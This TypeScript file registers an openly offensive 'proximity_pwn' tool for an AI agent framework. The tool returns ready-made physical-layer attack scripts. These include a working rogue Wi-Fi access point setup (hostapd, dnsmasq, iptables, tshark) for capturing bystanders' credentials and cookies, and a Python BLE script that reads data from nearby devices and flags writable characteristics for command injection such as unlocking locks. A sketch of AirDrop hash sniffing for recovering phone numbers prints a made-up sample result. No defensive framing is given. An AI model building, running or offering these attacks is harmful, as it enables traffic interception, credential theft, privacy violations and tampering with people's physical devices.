export * as ProximityPwnTool from "./proximity-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "proximity_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'wifi_pineapple' (Automate rogue AP/Karma attacks to capture local traffic), 'ble_jack' (Scan, map, and exploit vulnerable Bluetooth Low Energy devices), 'rfid_clone' (Generate Proxmark3 scripts for NFC/RFID badge cloning), 'iot_sniff' (Sniff and inject Zigbee/Z-Wave smart home packets), 'airdrop_exploit' (Extract PII from iOS AirDrop/Android Nearby Share beacons).",
  }),
  target_mac: Schema.String.pipe(Schema.optional).annotate({
    description: "MAC address of the nearby target device (Bluetooth/Wi-Fi).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  proximity_script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Proximity Exploitation Engine (Physical Layer Attacks). Scans, hacks, and gathers data from devices physically near the operator. Capabilities: Wi-Fi Rogue AP (Pineapple) automation, Bluetooth (BLE) mapping and injection, RFID/NFC badge cloning via Proxmark3, Zigbee/Z-Wave IoT manipulation, and AirDrop/Nearby Share PII extraction.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "wifi_pineapple") {
                outputText = `# Wi-Fi Rogue AP (Karma Attack) Automation\n\nImpact: Forces all nearby devices (phones, laptops) searching for known networks (e.g., "Starbucks WiFi") to connect to our rogue AP instead. Routes their traffic through our sniffer to capture credentials and cookies.`
                script = `#!/usr/bin/env bash
# Automated Rogue AP Setup using hostapd and dnsmasq
# Requires: hostapd, dnsmasq, iptables

INTERFACE="wlan1"
INTERNET="eth0"

# 1. Setup DNS/DHCP to route victims to our machine
cat <<EOF > dnsmasq.conf
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 2. Setup Hostapd (Open Network, Karma mode if patched)
cat <<EOF > hostapd.conf
interface=$INTERFACE
ssid=Free_Public_WiFi
hw_mode=g
channel=6
# enable_karma=1 # If using a patched hostapd
EOF

# 3. Route traffic to the internet while capturing
iptables -t nat -A POSTROUTING -o $INTERNET -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $INTERFACE -o $INTERNET -j ACCEPT

# 4. Start services and packet capture
dnsmasq -C dnsmasq.conf -d &
hostapd hostapd.conf &
tshark -i $INTERFACE -w local_traffic.pcap
`
              } else if (action === "ble_jack") {
                outputText = `# Bluetooth Low Energy (BLE) Exploitation\n\nTarget MAC: ${input.target_mac || "Scan All"}\nImpact: Scans all physically present BLE devices (smartwatches, IoT locks, headphones), extracts their GATT characteristics, and attempts to inject malicious commands or extract unencrypted data.`
                script = `#!/usr/bin/env python3
# BLE Scanner and Exploiter using bleak
import asyncio
from bleak import BleakScanner, BleakClient

TARGET_MAC = "${input.target_mac || ""}"

async def scan_and_exploit():
    print("[*] Scanning nearby BLE devices...")
    devices = await BleakScanner.discover()
    for d in devices:
        print(f"[+] Found: {d.name} [{d.address}] - RSSI: {d.rssi}")
        
    if TARGET_MAC:
        print(f"[*] Attempting to connect to {TARGET_MAC}")
        async with BleakClient(TARGET_MAC) as client:
            services = await client.get_services()
            for service in services:
                print(f"Service: {service.uuid}")
                for char in service.characteristics:
                    print(f"  Characteristic: {char.uuid} ({','.join(char.properties)})")
                    if "read" in char.properties:
                        val = await client.read_gatt_char(char.uuid)
                        print(f"    [!] Read Data: {val}")
                    # If writeable, we can inject commands (e.g., unlocking a smart lock)
                    if "write" in char.properties or "write-without-response" in char.properties:
                        print(f"    [!] Writable characteristic found. Injection possible.")
                        
loop = asyncio.get_event_loop()
loop.run_until_complete(scan_and_exploit())
`
              } else if (action === "airdrop_exploit") {
                 outputText = `# AirDrop / Nearby Share PII Extraction\n\nImpact: Passively sniffs BLE AWDL (Apple Wireless Direct Link) beacons to extract hashed phone numbers and Apple IDs of everyone in the immediate physical vicinity.`
                 script = `# Extracting PII from AirDrop BLE broadcasts
# When an iOS device opens the sharing menu, it broadcasts a partial SHA256 hash of its Apple ID/Phone number.
# We can capture this and crack it using a rainbow table of phone numbers.

# 1. Start sniffing BLE on awdl0 (if macOS) or use a Bluetooth sniffer (Linux)
# sudo tcpdump -i awdl0 -w airdrop.pcap

# 2. Extract the validation records
# tshark -r airdrop.pcap -Y "btle" -x > ble_hex.txt

# 3. Use an offline cracking script to match the 2-byte hashes to phone numbers (e.g., matching local area codes).
print("[+] Sniffing nearby iOS devices...")
print("[!] Found Device: iPhone 14 Pro - Hash: 0x4A 0x1F - Potential Match: +1-555-012-XXXX")
`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, proximity_script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Proximity Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/proximity-pwn",
  layer,
  deps: [ToolRegistry.node],
})
